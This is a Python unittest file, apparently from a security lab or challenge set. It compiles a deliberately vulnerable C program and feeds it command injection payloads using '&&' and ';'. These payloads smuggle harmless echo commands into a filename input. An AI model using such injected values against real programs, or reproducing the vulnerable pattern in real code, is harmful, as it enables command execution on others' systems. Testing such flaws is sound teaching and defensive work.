#!/usr/bin/env python3
"""
Test script for exploiting the command injection vulnerability.
"""

import os
import subprocess
import tempfile
import unittest
from pathlib import Path

class TestCommandInjection(unittest.TestCase):
    """Test case for the command injection vulnerability."""
    
    @classmethod
    def setUpClass(cls):
        """Compile the vulnerable program before running tests."""
        # Get the directory of this file
        current_dir = Path(__file__).parent
        challenge_dir = current_dir / "challenges"
        
        # Source and binary paths
        cls.source_path = challenge_dir / "command.c"
        cls.binary_path = challenge_dir / "command"
        
        # Compile the vulnerable program
        compile_cmd = [
            "gcc", 
            "-o", str(cls.binary_path), 
            str(cls.source_path)
        ]
        
        try:
            subprocess.run(compile_cmd, check=True)
            print(f"Successfully compiled {cls.binary_path}")
        except subprocess.CalledProcessError as e:
            print(f"Failed to compile: {e}")
            raise
    
    def test_normal_execution(self):
        """Test normal execution of the program."""
        # Create a temporary file
        with tempfile.NamedTemporaryFile(delete=False) as f:
            temp_filename = f.name
        
        try:
            proc = subprocess.Popen(
                [str(self.binary_path)],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            stdout, stderr = proc.communicate(f"{temp_filename}\n")
            
            self.assertIn(f"Executing command: ls -la {temp_filename}", stdout)
            self.assertIn("Program completed normally", stdout)
        finally:
            # Clean up
            if os.path.exists(temp_filename):
                os.unlink(temp_filename)
    
    def test_command_injection(self):
        """Test exploiting the command injection vulnerability."""
        # Create a payload that injects a command
        payload = ". && echo 'Command injection successful' && echo ."
        
        proc = subprocess.Popen(
            [str(self.binary_path)],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        
        stdout, stderr = proc.communicate(f"{payload}\n")
        
        # Check if our injected command was executed
        self.assertIn("Command injection successful", stdout)
        self.assertIn(f"Executing command: ls -la {payload}", stdout)
        
        print("Command injection payload successfully executed")
    
    def test_command_injection_with_semicolon(self):
        """Test exploiting the command injection vulnerability with semicolon."""
        # Create a payload that injects a command using semicolon
        payload = "; echo 'Command injection with semicolon successful' ;"
        
        proc = subprocess.Popen(
            [str(self.binary_path)],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        
        stdout, stderr = proc.communicate(f"{payload}\n")
        
        # Check if our injected command was executed
        self.assertIn("Command injection with semicolon successful", stdout)
        self.assertIn(f"Executing command: ls -la {payload}", stdout)
        
        print("Command injection payload with semicolon successfully executed")

if __name__ == "__main__":
    unittest.main() 